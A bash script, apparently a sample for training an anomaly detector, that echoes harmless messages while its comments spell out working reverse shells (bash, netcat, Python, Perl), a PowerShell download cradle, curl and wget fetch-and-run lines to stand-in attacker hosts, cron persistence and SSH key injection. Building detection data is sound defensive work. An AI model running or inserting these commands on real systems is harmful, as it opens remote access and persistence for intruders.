#!/bin/bash
# ============================================================
# SAFE SIMULATION — NOT A REAL REVERSE SHELL
# ============================================================
# This file contains reverse-shell-LIKE syntax for training
# the Odysseus-AI anomaly detection model. Every dangerous
# command is commented out or replaced with a harmless echo.
#
# DO NOT UNCOMMENT THE DANGEROUS LINES.
# ============================================================

echo "[SAFE] This is a training sample for Odysseus-AI"
echo "[SAFE] No actual reverse shell is established"

# ---- Pattern: Bash reverse shell (COMMENTED OUT — SAFE) ----
# The following line is what a real attacker would use:
# bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
echo "[DEMO] bash -i reverse shell pattern present (inactive)"

# ---- Pattern: Netcat reverse shell (COMMENTED OUT — SAFE) ----
# nc -e /bin/bash 10.0.0.50 4444
echo "[DEMO] netcat reverse shell pattern present (inactive)"

# ---- Pattern: Python reverse shell (COMMENTED OUT — SAFE) ----
# python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.0.0.50",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
echo "[DEMO] python reverse shell pattern present (inactive)"

# ---- Pattern: Perl reverse shell (COMMENTED OUT — SAFE) ----
# perl -e 'use Socket;$i="10.0.0.50";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
echo "[DEMO] perl reverse shell pattern present (inactive)"

# ---- Pattern: PowerShell download cradle (COMMENTED OUT — SAFE) ----
# powershell -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
echo "[DEMO] powershell download cradle pattern present (inactive)"

# ---- Pattern: Curl-based payload retrieval ----
# curl http://evil-server.example.com/malware.sh | bash
echo "[DEMO] curl pipe-to-bash pattern present (inactive)"

# ---- Pattern: Wget + execute ----
# wget -q http://10.0.0.50:8080/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd
echo "[DEMO] wget download-and-execute pattern present (inactive)"

# ---- Pattern: Cron persistence ----
# echo "* * * * * /tmp/backdoor" | crontab -
echo "[DEMO] cron persistence pattern present (inactive)"

# ---- Pattern: SSH key injection ----
# echo "ssh-rsa AAAAB3NzaC... attacker@evil" >> ~/.ssh/authorized_keys
echo "[DEMO] SSH key injection pattern present (inactive)"

# ---- Pattern: Suspicious environment variables ----
CALLBACK_HOST="192.168.1.100"
CALLBACK_PORT="4444"
EXFIL_URL="http://evil-c2.example.com/upload"
echo "[DEMO] C2 variables set: $CALLBACK_HOST:$CALLBACK_PORT"

# ---- Pattern: Base64 encoded command ----
ENCODED="ZWNobyAiSGVsbG8gZnJvbSBPZHlzc2V1cy1BSSBkZW1vIg=="
# In real malware: echo $ENCODED | base64 -d | bash
echo "[DEMO] Base64 payload: $ENCODED (not decoded/executed)"

echo ""
echo "[SAFE] Script completed. No harmful actions were taken."
echo "[SAFE] This file trains the anomaly detector to recognize"
echo "[SAFE] reverse shell patterns in scanned files."
